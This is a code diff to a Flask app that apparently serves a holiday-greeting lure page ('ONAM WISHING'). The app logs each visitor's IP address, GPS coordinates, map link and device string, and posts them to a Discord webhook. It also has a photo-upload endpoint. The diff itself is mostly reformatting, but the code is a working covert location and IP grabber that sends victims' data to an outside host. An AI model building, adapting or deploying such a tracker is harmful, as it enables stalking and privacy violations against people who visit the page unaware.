@@ -37,6 +37,7 @@ logger = logging.getLogger(__name__)
 def home():
     return render_template('new.html')
 
+
 @app.route('/log-initial', methods=['POST'])
 def log_initial():
     try:
@@ -48,18 +49,17 @@ def log_initial():
         lon = data.get('lon', 'Unknown')
 
         message = {
-            "content": (
-                "📱 New Access\n"
-                f"🌐 IP: {ip}\n"
-                f"📍 Location: {lat}, {lon}\n"
-                f"🗺️ Map: https://www.google.com/maps?q={lat},{lon}\n"
-                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                f"📱 Device: {request.user_agent}\n"
-                "\n"
-                "—\n"
-                "🔧 Code built by @mr.encrypter · cloned from GitHub\n"
-                "💻 Repository: github.com/Encrypter1233"
-            )
+            "content": ("ACCESS FROM ONAM WISHING"
+                        "📱 New Access\n"
+                        f"🌐 IP: {ip}\n"
+                        f"📍 Location: {lat}, {lon}\n"
+                        f"🗺️ Map: https://www.google.com/maps?q={lat},{lon}\n"
+                        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                        f"📱 Device: {request.user_agent}\n"
+                        "\n"
+                        "—\n"
+                        "🔧 Code built by @mr.encrypter · cloned from GitHub\n"
+                        "💻 Repository: github.com/Encrypter1233")
         }
 
         requests.post(DISCORD_WEBHOOK, json=message)
@@ -68,6 +68,7 @@ def log_initial():
     except Exception as e:
         logger.error(f"Log error: {str(e)}")
         return jsonify({"error": str(e)}), 500
+
 
 @app.route('/upload-photo', methods=['POST'])
 def upload_photo():
@@ -90,6 +91,7 @@ def upload_photo():
     except Exception as e:
         logger.error(f"Upload error: {str(e)}")
         return jsonify({"error": str(e)}), 500
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
